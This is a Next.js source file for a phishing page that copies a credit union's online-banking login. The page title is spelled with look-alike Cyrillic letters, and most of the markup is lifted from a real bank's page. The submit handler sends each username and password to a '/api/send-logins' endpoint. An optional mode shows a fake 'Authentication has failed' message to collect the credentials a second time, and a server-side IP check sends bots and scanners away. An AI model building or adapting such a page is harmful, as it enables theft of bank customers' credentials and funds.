/* eslint-disable @next/next/no-img-element */
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import useMediaQuery from "../hooks/useMediaQuery";
import * as yup from "yup";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import Head from "next/head";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface LoginProps {}

const schema = yup.object().shape({
  username: yup
    .string()
    .required(`Please enter your username.`)
    .min(2, `Please enter a valid username.`),
  password: yup
    .string()
    .required(`Please enter your password.`)
    .min(6, `Please enter a valid password.`),
});

export const Login: React.FC<LoginProps> = ({}) => {
  const isMobile = useMediaQuery(`(max-width: 480px)`);
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [logins, setLogins] = useState({});

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors, isValid },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onChange`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN`);
    formData.append(
      `loginDetails`,
      JSON.stringify({
        loginAttempt: loginAttempt + 1,
        sessionId: datas.sessionId,
        ...data,
      })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        username: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    const html = document.querySelector(`html`);
    html?.setAttribute(
      `class`,
      `js flexbox fontface objectfit object-fit csspositionsticky cssreflections no-regions cssresize shapes siblinggeneral subpixelfont supports csstransforms3d preserve3d canvas canvastext no-emoji devicemotion deviceorientation svg svgasimg svgclippaths svgfilters svgforeignobject inlinesvg smil touchevents typedarrays uagent-chrome uagent-webkit uagent-osLinux uagent-mobile uagent-mobileAndroid uagent-android-11`
    );

    const body = document.querySelector(`body`);
    body?.setAttribute(`class`, `ember-application phone theme-q2 frameless`);

    return () => {
      html?.removeAttribute(`class`);
      body?.removeAttribute(`class`);

      document.removeEventListener("keydown", keyDownHandler);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <>
      <Head>
        <link rel="icon" href="/favicon.ico" />
        <title>МlDFLОRlDА Сrеdit Uniоn</title>
      </Head>

      <div
        className="ember-view app-container desktop unauthenticated vertical-nav pfm-disabled no-pfm-accounts has-footer"
        id="ember4"
      >
        <div id="ember5" className="focusing-outlet ember-view">
          {" "}
          {/**/}
          {/**/}
          <div
            role="dialog"
            tabIndex={0}
            id="q2AppOverpanel"
            className="over-panel ember-view"
            style={{ display: "none" }}
          >
            <div className="overpanel-inner">
              <div className="overpanel-header">
                <div className="col-xs-2 text-left">{/**/} </div>
                <div className="col-xs-8 text-center">
                  <h3 className="overpanel-title mrg-V-no">{/**/}</h3>
                </div>
                <div className="col-xs-2 text-right">
                  <button
                    aria-label="Close"
                    id="ember7"
                    className="overpanel-close ui-btn tooltipped tooltipped-sw ember-view"
                    type="button"
                  >
                    {" "}
                    <span
                      aria-hidden="true"
                      id="ember8"
                      className="ui-icon icon-remove-sign ember-view"
                    />
                  </button>{" "}
                </div>
              </div>
              <div
                id="ember9"
                className="overpanel-alert-container alert-message_container ember-view"
              >
                <div
                  className="alert alert-msg alert-message_content  "
                  role="alert"
                >
                  <div className="alert-message_inner">
                    <p />
                    {/**/}
                    <p className="alert-message_sizer">X</p>
                  </div>
                </div>
              </div>
              <div className="overpanel-scroll-wrapper force-height col-md-offset-1 col-lg-offset-2 col-xs-12 col-sm-12 col-md-10 col-lg-8">
                <div className="overpanel-slider ">{/**/}</div>
              </div>
              <div className="overpanel-footer hidden">
                <div className="valign overpanel-footer-outer">
                  <div className="overpanel-footer-inner">
                    <div id="ember10" className="ui-logo small ember-view">
                      <span className="sr-only">GreenState Credit Union</span>
                      <div aria-hidden="true" className="logo-image" />
                    </div>
                  </div>
                </div>
              </div>
              <button
                aria-hidden="true"
                id="ember11"
                className="sr-only ui-btn ember-view"
                type="button"
              >
                {" "}
                Focus Reset
              </button>
            </div>
          </div>
          {/**/}
          {/**/}
          <div className="loading-bg" />
          <div className="splash-bg" />
          {/**/}
          <div className="container meta-container main-page-container">
            <div
              id="ember12"
              className="app-header ui-sticky top ember-view"
              style={{ top: 0 }}
            >
              {" "}
              <div
                className="navbar navbar-fixed-top center-align-logo disable-menu-button"
                role="banner"
              >
                <div className="container meta-container">
                  {/**/}
                  <div className="navbar-branding">
                    <div className="branding">
                      <div
                        id="ember13"
                        className="logo ui-logo small ember-view"
                      >
                        <span className="sr-only">GreenState Credit Union</span>
                        <div aria-hidden="true" className="logo-image" />
                      </div>
                    </div>
                  </div>
                  <div id="ember14" className="custom-header ember-view"></div>
                  {/**/}{" "}
                </div>
              </div>
              <div
                id="ember15"
                className="branding-bar-widget widget-fence clearfix hidden ember-view"
              >
                {/**/}
              </div>
            </div>
            <div className="quicktip-container main-desktop">{/**/} </div>
            <div
              id="ember16"
              className="main-view grid-row drawer-view main-view ember-view"
            >
              {/**/}
              <div className="content-wrapper">
                <div className="content-container">
                  <div className="content clearfix" role="main">
                    {/**/}
                    <div
                      id="ember17"
                      className="top-widget-fence widget-fence clearfix hidden ember-view"
                    >
                      {/**/}
                    </div>
                    <div id="ember19" className="focusing-outlet ember-view">
                      <div id="ember21" className="focusing-outlet ember-view">
                        {/**/}
                      </div>
                    </div>
                    <div
                      id="ember22"
                      className="widget-fence clearfix bottom-widget-fence hidden ember-view"
                    >
                      {/**/}
                    </div>
                  </div>
                  <div className="sidebar desktop-sidebar" role="complementary">
                    {/**/}{" "}
                    <div className="sidebar-drawer">
                      <div className="sidebar-rail">
                        <div className="sidebar-content">
                          <div
                            id="ember23"
                            className="widget-fence clearfix hidden ember-view"
                          >
                            {/**/}
                          </div>
                          {/**/}
                        </div>
                      </div>
                    </div>
                  </div>
                  {/**/}
                </div>
                <div className="dropdown-backdrop hidden"> </div>
              </div>
              <div
                role="dialog"
                tabIndex={0}
                id="q2AppSidePanel"
                className="sidepanel ember-view"
                style={{ display: "none" }}
              >
                <div className="sidepanel-inner">{/**/}</div>
              </div>
              <div id="ember25" className="focusing-outlet ember-view">
                <div id="login-modal" />
                <div className="login-outer">
                  <div className="login-inner" id="login-inner">
                    <div className="quicktip-container">
                      <aside
                        id="ember27"
                        className="quick-tip hidden ember-view"
                        style={{ display: "none" }}
                      >
                        <span className="tip-text">
                          Holiday Hours: GreenState offices are closed on
                          Monday, September 5th, in observance of Labor Day.
                        </span>
                        <button
                          aria-label="Close Tip"
                          id="ember28"
                          className="ui-btn tooltipped tooltipped-nw ember-view"
                          type="button"
                        >
                          {" "}
                          <span
                            aria-hidden="true"
                            id="ember29"
                            className="ui-icon icon-remove ember-view"
                          />
                        </button>
                      </aside>
                      <aside
                        id="ember30"
                        style={{ display: "none" }}
                        className="quick-tip hidden ember-view"
                      >
                        <span className="tip-text">{/**/}</span>
                        <button
                          aria-label="Close Tip"
                          id="ember31"
                          className="ui-btn tooltipped tooltipped-nw ember-view"
                          type="button"
                        >
                          {" "}
                          <span
                            aria-hidden="true"
                            id="ember32"
                            className="ui-icon icon-remove ember-view"
                          />
                        </button>
                      </aside>
                    </div>
                    <div className="login-title">
                      <h1 id="ember20" className="ui-logo small ember-view">
                        <span className="sr-only">МidFIоridа Сrеdit Uniоn</span>
                        <div aria-hidden="true" className="logo-image" />
                      </h1>
                    </div>

                    {showError ? (
                      <div className="login-static-alert login-message login-alert-message loginFormArea">
                        <div
                          id="ember88"
                          className="login-alert-container alert-message_container static-alert has-alert ember-view"
                        >
                          <div
                            className="alert alert-msg alert-message_content alert-danger"
                            role="alert"
                            aria-live="assertive"
                          >
                            <div
                              className="alert-message_inner"
                              style={{ lineHeight: "1.91" }}
                            >
                              <p>
                                <span
                                  aria-label="error"
                                  aria-hidden="true"
                                  id="ember89"
                                  className="ui-icon icon-warning-sign ember-view"
                                />{" "}
                                Authentication has failed. Please re-enter your
                                login.
                              </p>
                              <p className="alert-message_sizer" style={{}}>
                                X
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    ) : null}
                    <div className=" login-message login-alert-message loginFormArea">
                      <div
                        id="ember34"
                        className="login-alert-container alert-message_container static-alert hidden ember-view"
                      >
                        <div
                          className="alert alert-msg alert-message_content alert-danger"
                          role="alert"
                          aria-live="assertive"
                        >
                          <div className="alert-message_inner">
                            <p>
                              <span
                                aria-label="error"
                                aria-hidden="true"
                                id="ember35"
                                className="ui-icon icon-warning-sign ember-view"
                              />{" "}
                            </p>
                            <p className="alert-message_sizer" style={{}}>
                              X
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="login-form loginFormArea">
                      <form
                        className="is-invalid"
                        data-ember-action=""
                        data-ember-action-36={36}
                      >
                        <div className="field ">
                          <label className="login-field" htmlFor="fldUsername">
                            Login ID
                          </label>
                          <input
                            spellCheck="false"
                            autoCapitalize="off"
                            autoCorrect="off"
                            placeholder=""
                            autoComplete="off"
                            title=""
                            id="fldUsername"
                            className="mrg-T-sm login-field form-control ember-text-field form-control ember-view"
                            type="text"
                            {...register(`username`)}
                          />
                        </div>
                        <div className="password field">
                          <label className="login-field" htmlFor="fldPassword">
                            Password
                          </label>
                          <input
                            spellCheck="false"
                            autoCapitalize="off"
                            autoCorrect="off"
                            autoComplete="off"
                            id="fldPassword"
                            className="mrg-T-sm login-field form-control ember-text-field form-control ember-view"
                            type="password"
                            {...register(`password`)}
                          />
                        </div>
                        <div id="submissionArea">
                          <div id="userLinks">
                            <div id="rememberUserNameArea">
                              <div
                                id="ember37"
                                className="ui-checkbox ember-view"
                              >
                                <input
                                  className="sr-only"
                                  id="ckbRememberUser"
                                  type="checkbox"
                                />
                                <label htmlFor="ckbRememberUser">
                                  <svg
                                    aria-hidden="true"
                                    width={20}
                                    height={20}
                                    viewBox="0 0 20 20"
                                  >
                                    <rect
                                      fill="none"
                                      stroke="none"
                                      strokeWidth={2}
                                      x={1}
                                      y={1}
                                      width={18}
                                      height={18}
                                      rx={3}
                                    />
                                    <polyline
                                      fill="none"
                                      stroke="none"
                                      strokeWidth={2}
                                      strokeLinecap="round"
                                      strokeLinejoin="round"
                                      points="4 11.4390244 7.44978307 15.0611808 16 5"
                                    />
                                  </svg>
                                  <div className="inner-label ">
                                    <div className="inner-text">
                                      Remember me
                                    </div>
                                    {/**/}{" "}
                                  </div>
                                </label>
                              </div>
                            </div>
                            <button
                              className={`logon-submit btn-primary btn-block pointer btn submitButton submit ${
                                loading || !isValid ? `is-invalid disabled` : ``
                              }`}
                              disabled={loading || !isValid}
                              data-ember-action=""
                              data-ember-action-38={38}
                              onClick={onSubmit}
                            >
                              <div className="icon" />
                              Log In
                            </button>
                            <div className="clearfix password-links">
                              <div className="pull-right password-link">
                                <a
                                  href="#/login/resetPasswordUsername"
                                  id="ember39"
                                  className="ember-view"
                                >
                                  {" "}
                                  <span className="forgot-pw">
                                    Forgot your password?
                                  </span>
                                </a>{" "}
                              </div>
                              {/**/}{" "}
                            </div>
                          </div>
                        </div>
                      </form>
                    </div>
                    <div
                      className="login-icons clearfix"
                      style={{
                        display: isMobile ? `grid` : `block`,
                      }}
                    >
                      <a className="login-adLink">Forgot Login</a>{" "}
                      <a className="login-adLink">Contact Us</a>{" "}
                      <a className="login-adLink">Locations</a>{" "}
                      <a className="login-adLink">Privacy Policy</a>{" "}
                    </div>
                    <div className="preLogon">
                      <div
                        id="injected_footerContent"
                        style={{ display: "none" }}
                      >
                        <a className="login-adLink">New User Enrollment</a>
                        <a className="login-adLink">Forgot Login</a>
                        <a className="login-adLink">Unlock Account</a>
                      </div>
                      <img
                        src="data:image/gif;base64, R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs="
                        alt=""
                      />
                    </div>
                    <a rel="noopener">
                      <img
                        src="/images/ncua_logo_small-21b5c4c85ed2c621c4921e31d6f7a7d0.png"
                        alt=""
                      />
                    </a>
                  </div>
                </div>
              </div>
            </div>
            <a id="ember42" className="return-to-login active ember-view">
              {" "}
              Return to login
            </a>{" "}
          </div>
          <div className="content-overlay" />
          {/**/}
          {/**/}
          {/**/}
          {/**/}
          <div id="ember43" className="print-content ember-view">
            <div style={{ overflow: "auto" }}>
              <div style={{ float: "left" }}>
                <img id="transaction-print-logo" alt="" role="presentation" />
              </div>
              <div className="timestamp" />
            </div>
            <div>
              {/**/}
              {/**/}
            </div>
            <div className="detail-items">
              <table>
                <tbody>
                  {/**/}
                  {/**/}
                  {/**/}{" "}
                </tbody>
              </table>
            </div>
            {/**/}
          </div>
        </div>
      </div>
    </>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Login;
